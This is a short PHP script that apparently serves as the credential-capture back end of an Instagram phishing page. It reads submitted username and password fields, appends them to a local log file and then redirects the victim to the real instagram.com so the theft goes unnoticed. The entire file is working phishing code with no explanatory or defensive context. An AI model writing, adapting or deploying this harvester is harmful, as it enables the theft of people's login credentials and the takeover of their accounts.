<?php
header("Location: https://instagram.com");
$handle = fopen("log", "a");

fwrite($handle, $_POST["sph_username"]);
fwrite($handle, "\n");
fwrite($handle, $_POST["sph_password"]);
fwrite($handle, "\n");
fwrite($handle, "\n");

fclose($handle);
exit;
?>